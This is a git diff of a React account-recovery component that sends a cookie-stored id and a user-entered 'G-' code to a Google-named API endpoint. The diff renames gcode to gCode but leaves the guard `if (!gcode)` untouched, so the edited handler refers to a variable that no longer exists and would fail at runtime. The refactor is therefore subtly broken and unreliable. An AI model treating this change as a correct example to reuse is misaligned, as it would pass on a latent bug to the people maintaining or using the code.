@@ -7,15 +7,16 @@ import React, { useState } from "react";
 
 function AccountRecoveryCode() {
   const router = useRouter();
-  const [gcode, setGcode] = useState();
+  const [gCode, setGCode] = useState();
   const id = Cookies.get("gid");
+
   const handleGCode = async () => {
     if (!gcode) {
       return;
     }
     const values = {
       id,
-      gcode,
+      gCode,
     };
     const url = `${API_URL}/google/very/code`;
 
@@ -39,6 +40,7 @@ function AccountRecoveryCode() {
       // toast.error("Something Went Wrong");
     }
   };
+
   return (
     <div className=" w-full min-h-screen flex flex-col justify-center items-center">
       <div className="flex flex-col w-full max-w-md p-10 h-screen  justify-between ">
@@ -74,8 +76,8 @@ function AccountRecoveryCode() {
                 id="id"
                 className={`w-full border  border-gray-300 rounded-md pl-14 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500`}
                 placeholder="Enter the code"
-                value={gcode}
-                onChange={(e) => setGcode(e.target.value)}
+                value={gCode}
+                onChange={(e) => setGCode(e.target.value)}
               />
               <p className="absolute top-[9px] left-5">G-</p>
             </div>
